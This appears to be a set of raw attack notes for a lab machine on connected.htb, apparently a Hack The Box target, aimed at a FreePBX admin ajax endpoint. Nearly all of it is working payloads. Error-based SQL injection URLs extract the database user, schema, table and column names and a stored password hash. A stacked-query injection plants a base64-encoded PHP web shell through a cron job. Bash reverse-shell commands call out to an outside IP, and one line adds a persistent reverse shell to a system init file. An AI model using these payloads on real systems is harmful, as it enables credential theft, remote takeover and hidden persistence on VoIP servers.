```
- Verify SQLi
curl -i -k "https://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT+USER()),'~'))+--+"

- Check the Database name
https://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~',(SELECT DATABASE()),'~'))+--+

- Check the tables name
https://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~',(SELECT table_name FROM information_schema.tables where table_schema='asterisk' LIMIT 0,1),'~'))+--+

- Check the column name
https://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~',(SELECT column_name FROM information_schema.columns WHERE table_name='ampuser' LIMIT 0,1),'~'))+--+

-
https://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~',(SELECT LENGTH(password_sha1) FROM ampusers LIMIT 0,1),'~'))+--+
https://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~',(SELECT SUBSTRING(password_sha1,1,20) FROM ampusers LIMIT 0,1),'~'))+--+
https://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x';INSERT INTO cron_jobs (id,modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) VALUES ('90','sysadmin','notwell-system','echo \"PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2BCg==\"|base64 -d >/var/www/html/cmd-shell02.php',NULL,'* * * * *','30','1','1');--

- Execute web shell to get reverse shell:
curl -ik "https://connected.htb/cmd-shell02.php?cmd=bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2E1%2E167%2F4444%200%3E%261"

echo 'bash -c "bash -i >& /dev/tcp/<TUNNEL_IP>/4445 0>&1" &' >> /etc/dahdi/init.conf

```
